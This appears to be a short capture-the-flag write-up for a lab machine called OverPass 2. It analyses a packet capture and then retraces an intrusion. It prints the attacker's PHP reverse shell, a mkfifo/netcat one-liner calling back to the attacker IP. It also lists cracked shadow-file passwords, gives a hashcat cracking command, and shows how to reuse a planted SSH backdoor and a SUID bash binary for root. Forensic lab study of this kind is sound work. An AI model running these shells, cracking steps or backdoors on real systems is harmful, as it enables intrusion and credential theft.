# OverPass 2

## pcap analysis

- Attacker IP: `192.168.170.145`
- packet 14 POST to /development/upload.php
- Attacker uploaded the following reverse shell
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
- Note port `4242`
- packet 167/168 auth over netcat by attacker: user: `james`, password: `whenevernoteartinstant`
- Attacker used `https://github.com/NinjaJc01/ssh-backdoor` to establish persistence

- `/etc/shadow` was dumped. There were 4 easily crackable passwords (via fasttrack.txt)
```
paradox:secuirty3:18464:0:99999:7:::
szymex:abcd123:18464:0:99999:7:::
bee:secret12:18464:0:99999:7:::
muirland:1qaz2wsx:18464:0:99999:7:::
```

- hash used by attacker: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

- Easily bruteforced with `hashcat -m 1710 att_hash.txt /usr/share/wordlists/rockyou.txt`
- attacker password: `november16`


- backdoor still open on port 2222
- user:`james`, password:`november16`

- attacker left `/home/james/.suid_bash` for root access
- run with `/home/james/.suid_bash -p` for root shell
